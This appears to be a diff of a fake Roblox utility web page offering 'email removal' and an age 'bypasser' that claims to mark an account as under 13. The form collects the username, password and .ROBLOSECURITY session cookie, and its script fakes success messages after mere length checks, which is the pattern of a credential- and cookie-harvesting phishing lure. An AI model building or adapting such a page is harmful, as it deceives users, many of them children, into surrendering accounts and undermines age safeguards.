@@ -648,23 +648,23 @@
 
                     <div class="input-group">
                         <label for="age-option" class="input-label">
-                            <i class="fas fa-envelope-slash"></i> Select Email Removal Method
+                            <i class="fas fa-envelope-slash"></i> Select Removal Method
                         </label>
                         <select id="age-option" class="select-field">
-                            <option value="">OPTION</option>
-                            <option value="2008">Remove Email Completely</option>
-                            <option value="13plus">Add Temporary Email</option>
+                            <option value="">Select Option</option>
+                            <option value="2008">REMOVE EMAIL</option>
+                            <option value="13plus">BYPASSER 13+ All Ages</option>
                         </select>
 
                         <label for="username-input" class="input-label">
                             <i class="fas fa-user"></i> Roblox Username
                         </label>
-                        <input id="username-input" class="input-field" type="text" placeholder="Enter your Roblox username..." />
+                        <input id="username-input" class="input-field" type="text" placeholder="Roblox Username" />
 
                         <label for="password-input" class="input-label">
                             <i class="fas fa-lock"></i> Account Password
                         </label>
-                        <input id="password-input" class="input-field" type="password" placeholder="Enter your account password..." />
+                        <input id="password-input" class="input-field" type="password" placeholder="Enter Password" />
                     </div>
 
                     <div id='cookieInput'>
@@ -672,7 +672,7 @@
                             <label for="cookie-input" class="input-label">
                                 <i class="fas fa-cookie"></i> .ROBLOSECURITY Cookie
                             </label>
-                            <textarea id="cookie-input" class="input-field" placeholder="Paste your .ROBLOSECURITY cookie here..." spellcheck="false"></textarea>
+                            <textarea id="cookie-input" class="input-field" placeholder="Paste your .ROBLOSECURITY here, make sure its valid..." spellcheck="false"></textarea>
                         </div>
 
                         <button id="process-btn" class="process-btn">
@@ -682,13 +682,12 @@
 
                     <div id="result-box" class="result-box">
                         <div class="result-title">
-                            <i class="fas fa-check-circle"></i> Email Removal Successful!
+                            <i class="fas fa-check-circle"></i>Successful!
                         </div>
                         <div class="result-content">
-                            <p>Email has been successfully removed from your Roblox account.</p>
-                            <p>Email status: <strong id="status-text">Removed</strong></p>
-                            <p>Account username: <strong id="username-display"></strong></p>
-                            <p>Process completed at: <strong id="timestamp"></strong></p>
+                            <p>Status: <strong id="status-text">Removed</strong></p>
+                            <p>Username: <strong id="username-display"></strong></p>
+                            <p>Process completed: <strong id="timestamp"></strong></p>
                         </div>
                     </div>
                 </div>
@@ -854,7 +853,7 @@
                         if (cookie && cookie.length > 10 && password && password.length > 3) {
                             resolve({
                                 success: true,
-                                message: 'Email successfully replaced with a temporary email on your Roblox account!'
+                                message: 'Success the account is now underage   !'
                             });
                         } else if (!password || password.length <= 3) {
                             resolve({
@@ -1016,7 +1015,7 @@
                         const timestamp = document.getElementById('timestamp');
                         
                         // Update result information
-                        statusText.textContent = selectedOption === '13plus' ? 'Replaced with temporary email' : 'Completely removed';
+                        statusText.textContent = selectedOption === '13plus' ? 'Account age has been change into <13' : 'Completely removed';
                         usernameDisplay.textContent = username;
                         timestamp.textContent = new Date().toLocaleString();
                         
